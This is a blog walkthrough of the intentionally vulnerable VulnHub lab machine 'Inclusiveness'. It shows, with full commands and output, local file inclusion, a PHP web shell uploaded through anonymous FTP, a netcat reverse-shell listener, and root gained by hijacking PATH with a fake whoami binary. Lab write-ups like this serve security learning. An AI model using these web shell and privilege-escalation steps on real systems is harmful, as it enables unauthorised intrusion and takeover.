<html>

<?php include '../header.php';?>

<body>

<?php include '../navbar.php';?>

    <div class="body-content">
        <h2>
            Inclusiveness
        </h2>
        <img class="headerpic" src="https://placekitten.com/100/100" alt="Hack the Planet" height="200px" width="300px" align="middle" align="left">
        <p class="date">2020-04-15</p>
        <p class="text">
            This VM was created by <a href="https://twitter.com/h4sh5">h4sh5</a> and Richard Lee.  I love the concept!  Turned out this was a beginner/intermediate box forcing the attacker to put two things together to get a shell.  For privilege escalation, I would have liked to see a multi-step path to root (www-data to user to root), but the privesc exploit reminded me of the basics.  I was stuck for a while and didn't root the VM until I broke apart the problem into its components.  The VM can be downloaded:<a href="https://www.vulnhub.com/entry/inclusiveness-1,422/">here</a>.
        </p>
        <p class="text">
            We began the machine with enumeration of the network services.
        </p>
        <pre>
    root@kali:~/Documents/inclusiveness# cat nmap/192.168.0.128.nmap 
    # Nmap 7.80 scan initiated Sat Apr 11 17:11:36 2020 as: nmap -p- -oA nmap/192.168.0.128 -Pn -T5 -sV -v0 --host-timeout 99999m 192.168.0.128
    Nmap scan report for 192.168.0.128
    Host is up (0.00058s latency).
    Not shown: 65532 closed ports
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    MAC Address: 00:0C:29:53:BE:04 (VMware)
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
        </pre>
        <p class="text">
            From this, it's clear we have three services:
            <ul>
                <li>FTP (21/TCP)</li>
                <li>SSH (22/TCP)</li>
                <li>HTTP (80/TCP)</li>
            </ul>
            Given the SSH version, there wasn't much information to gather.  SSH had no banner, passwords were enabled, and user enumeration was not possible.  During enumeration, I also found that FTP was anonymously accessible, containing a single writable folder, "pub" with no contents.  The HTTP service was interesting.  Other than default content, the site returned an interesting response to the following requests:
        </p>
        <pre>
    root@kali:~/Documents/inclusiveness# curl http://192.168.0.128/doesntexist-robots.txt
    You are not a search engine! You can't read my robots.txt!
    root@kali:~/Documents/inclusiveness# curl http://192.168.0.128/robots.txt
    You are not a search engine! You can't read my robots.txt!
        </pre>
        <p class="text">
            I've seen this type of behavior before in CTFs and others.  The same resource was being returned by the web server depending on a keyword.  Most of the other times I'd seen this it was Apache's mod_rewrite module inspecting URLs and returning responses.  In this case, the word "robot" revealed an error.   How can we impersonate a search engine?  I found this article, which did a pretty good job at explaining <a href="https://blogs.akamai.com/2014/07/search-engine-impersonation-the-wolf-in-sheeps-clothing.html">https://blogs.akamai.com/2014/07/search-engine-impersonation-the-wolf-in-sheeps-clothing.html</a>.  If my hypothesis was correct, all I'd have to do is change my "User Agent" string (the HTTP User-Agent header) and the server would respond with a different response (hopefully the actual robots.txt).
        </p>
        <pre>
    root@kali:~/Documents/inclusiveness# curl -H "User-Agent: Googlebot/2.0" http://192.168.0.128/robots.txt
    User-agent: *
    Disallow: /secret_information/
        </pre>
        <p class="text">
            Great! Next, I took a look at the /secret_information/ directory.  We are returned with what appears to be a simple page explaining the concept of a DNS Zone Transfer.
        </p>
        <pre>
    root@kali:~/Documents/inclusiveness# curl http://192.168.0.137/secret_information/
    &lt;title&gt;zone transfer&lt;/title&gt;

    &lt;h2&gt;DNS Zone Transfer Attack&lt;/h2&gt;

    &lt;p&gt;&lt;a href='?lang=en.php'&gt;english&lt;/a&gt; &lt;a href='?lang=es.php'&gt;spanish&lt;/a&gt;&lt;/p&gt;

    DNS Zone transfer is the process where a DNS
        </pre>
        <p class="text">
            I wasn't too worried about the title or text content, but keyed in on the PHP functionality.  I assumed this must be serving "index.php" because there was a "lang" parameter which appeared to change the language of the page.  Not only that, the lang parameter appeared to serve content from local files named "en.php" and "es.php".  To confirm, I tried to include a local file outside of the web root (/etc/passwd).
        </p>
        <pre>
    root@kali:~/Documents/inclusiveness# curl -s http://192.168.0.128/secret_information/?lang=/etc/passwd
    &lt;title&gt;zone transfer&lt;/title&gt;

    &lt;h2&gt;DNS Zone Transfer Attack&lt;/h2&gt;

    &lt;p&gt;&lt;a href='?lang=en.php'&gt;english&lt;/a&gt; &lt;a href='?lang=es.php'&gt;spanish&lt;/a&gt;&lt;/p&gt;

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
    tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
    dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    avahi-autoipd:x:107:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
    usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
    rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
    sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
    avahi:x:113:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
    saned:x:114:121::/var/lib/saned:/usr/sbin/nologin
    colord:x:115:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
    geoclue:x:116:123::/var/lib/geoclue:/usr/sbin/nologin
    tom:x:1000:1000:Tom,,,:/home/tom:/bin/bash
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
    ftp:x:118:125:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
        </pre>
        <p class="text">
            Another win.  Now we can try to include any local file on the system, however, we aren't able to list directories.  In my limited experience, whenever a web application is vulnerable to a local file inclusion, you should always, always, always, test for remote file inclusion.  I did just that.  I stood up a simple python web server, included a HTTP path to my own server, made the request, but didn't receive any request back.  I tried a few other ports to test if the failure was a result of a firewall, but the application didn't appear to be vulnerable to remote file inclusion.  At this point, we don't really have a way to execute remote code unless we can control the content of a local PHP file.  This is where I had to put two and two together.  In a similar way to one of my favorite OSCP boxes, "Bob", I combined two mis-configurations together to execute remote code. Remember the anonymous FTP write capability!?  The vsftpd service allows us to upload malicious PHP, but in order to include it within the web application, we'd need to know its path.  Luckily, I found this within the vsftp configuration file, /etc/vsftpd.conf.
        </p>
        <pre>
        root@kali:~/Documents/inclusiveness# curl -s -H "User-Agent: Googlebot/2.0" http://192.168.0.137/secret_information/?lang=/etc/vsftpd.conf | grep root | grep -v '#'
        secure_chroot_dir=/var/run/vsftpd/empty
        anon_root=/var/ftp/
        </pre>
        <p class="text">
            Good.  So the LFI vulnerability can leak the path to the FTP server root, we're able to write anonymously to the FTP server, and we're able to include that malicious PHP code within the web application! Let's test with a simple webshell.  
        </p>   
        <pre>
    root@kali:~/Documents/inclusiveness# echo '&lt;?php echo system($_REQUEST["h00p"]);?&gt;' &gt; h00p.php
    root@kali:~/Documents/inclusiveness# ftp 192.168.0.128
    Connected to 192.168.0.128.
    220 (vsFTPd 3.0.3)
    Name (192.168.0.128:root): anonymous
    331 Please specify the password.
    Password:
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> put h00p.php pub/h00p.php
    local: h00p.php remote: pub/h00p.php
    200 PORT command successful. Consider using PASV.
    150 Ok to send data.
    226 Transfer complete.
    40 bytes sent in 0.00 secs (169.1017 kB/s)

    root@kali:~/Documents/inclusiveness# curl -s -H "User-Agent: Googlebot/2.0" 'http://192.168.0.137/secret_information/?h00p=id&lang=/var/ftp/pub/h00p.php'
    &lt;title&gt;zone transfer&lt;/title&gt;

    &lt;h2&gt;DNS Zone Transfer Attack&lt;/h2&gt;

    &lt;p&gt;&lt;a href='?lang=en.php'&gt;english&lt;/a&gt; &lt;a href='?lang=es.php'&gt;spanish&lt;/a&gt;&lt;/p&gt;

    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

        </pre>
        <p class="text">
            I'm not sure why the command executed twice (I've seen this before but haven't figured it out).  Nonetheless, it confirms code execution!  I ended up turning this into a fully interactive reverse shell with pentestmonkey's PHP reverse shell. I uploaded the shell, included it within the PHP web application, used Python to upgrade to a PTY shell, then set the TERM environment variable for usability.  
        </p>
        <pre>
    curl -s -H "User-Agent: Googlebot/2.0" http://192.168.0.137/secret_information/?lang=/var/ftp/pub/rev2.php

    root@kali:~/Documents/inclusiveness# nc -nlvp 443
    Listening on 0.0.0.0 443
    Connection received on 192.168.0.137 41762
    Linux inclusiveness 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux
     04:31:52 up 1 day, 21:55,  0 users,  load average: 0.00, 0.00, 0.00
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ python -c 'import pty;pty.spawn("/bin/bash");'
    www-data@inclusiveness:/$ export TERM=xterm-256color
    export TERM=xterm-256color
        </pre>
        <p class="text">
        I stumbled around the filesystem looking for clues, but didn't find many at all.  There didn't appear to be many suspect processes running, the kernel and OS didn't look too old, and there was only one user, tom.  Tom's home folder was readable by www-data.  The most interesting file on the system happened to be in tom's home directory.  It was an SUID binary with the source available.   
        </p>
        <pre>
    # ls -al rootshell*
    ls -al rootshell*
    -rwsr-xr-x 1 root root 16976 Feb  8 13:01 rootshell
    -rw-r--r-- 1 tom  tom    448 Feb  8 13:01 rootshell.c
    # cat rootshell.c
    cat rootshell.c
    #include &lt;stdio.h&gt;
    #include &lt;unistd.h&gt;
    #include &lt;stdlib.h&gt;
    #include &lt;string.h&gt;

    int main() {

        printf("checking if you are tom...\n");
        FILE* f = popen("whoami", "r");

        char user[80];
        fgets(user, 80, f);

        printf("you are: %s\n", user);
        //printf("your euid is: %i\n", geteuid());

        if (strncmp(user, "tom", 3) == 0) {
            printf("access granted.\n");
        setuid(geteuid());
            execlp("sh", "sh", (char *) 0);
        }
    }
        </pre>
        <p class="text">
            Initially, I had difficulty exploiting this bug.  It was a custom SUID binary owned by root! This was clearly the easiest way to escalate privileges.  The program appeared to run the command "whoami", take the output of that command and store it in a buffer (user), then check if the first three bytes of that buffer were "tom".  If so, it spawned a shell within the context of the program.  There appeared to be a couple obvious vulnerabilities.  First off, if a user named tom1 or tomcat were to run this program, it would also be granted root privileges.  I knew that I couldn't just change the output of the "whoami" binary without hooking the functions themselves (would require root privileges anyway). Then, I realized that the program may not even call the system "whoami" binary.  What if we could manipulate it into running our own "whoami" program?  I remember reading a writeup by <a href="https://twitter.com/0xm1rch">Rich Mirch</a>, a local pentester, on his <a href="https://blog.mirch.io/">blog</a>.  I don't remember which article, but it essentially gained elevated privileges by manipulating $PATH to trick the service into executing arbitrary code.  I decided to create my own "whoami" binary that always returned "tom".  I created the binary (also named whoami), changed my $PATH variable to first search in the /tmp/ directory for binaries, then executed the SUID rootshell to gain root privileges. 
        </p>
        <pre>
    www-data@inclusiveness:/tmp$ echo '#include &lt;stdio.h&gt;' &gt; whoami.c
    echo '#include &lt;stdio.h&gt;' &gt; whoami.c
    www-data@inclusiveness:/tmp$ echo 'main(){printf("tom");}' &gt;&gt; whoami.c
    echo 'main(){printf("tom");}' &gt;&gt; whoami.c
    www-data@inclusiveness:/tmp$ gcc whoami.c -o whoami && chmod +x whoami
    gcc whoami.c -o whoami && chmod +x whoami
    whoami.c:2:1: warning: return type defaults to 'int' [-Wimplicit-int]
     main(){printf("tom");}
     ^~~~
    www-data@inclusiveness:/tmp$ ./whoami
    ./whoami
    tomwww-data@inclusiveness:/tmp$ 

    www-data@inclusiveness:/tmp$ /home/tom/rootshell
    /home/tom/rootshell
    checking if you are tom...
    you are: www-data

    www-data@inclusiveness:/tmp$ export PATH=/tmp:$PATH
    export PATH=/tmp:$PATH
    www-data@inclusiveness:/tmp$ /home/tom/rootshell
    /home/tom/rootshell
    checking if you are tom...
    you are: tom
    access granted.
    # id
    id
    uid=0(root) gid=33(www-data) groups=33(www-data)
    # cd /root
    cd /root
    # ls
    ls
    flag.txt
    # cat flag.txt
    cat flag.txt
    |\---------------\
    ||                |
    || UQ Cyber Squad |       
    ||                |
    |\~~~~~~~~~~~~~~~\
    |
    |
    |
    |
    o

    flag{omg_you_did_it_YAY}
    # hostname
    hostname
    inclusiveness
        </pre>
        <p class="text">
            I really enjoyed rooting inclusiveness!  Looking back, I get the name as its vulnerable to a Local File Inclusion and $PATH tampering.  I especially enjoy rooting machines that require leveraging multiple services or configurations to achieve RCE.  The privilege escalation was a nice reminder as well to break apart a problem and think critically about the components.  Big thanks to the creators, <a href="https://twitter.com/h4sh5">h4sh5</a> and Richard Lee.  
        </p>
    </div>
</body>
<?php include '../footer.php';?>
</html>
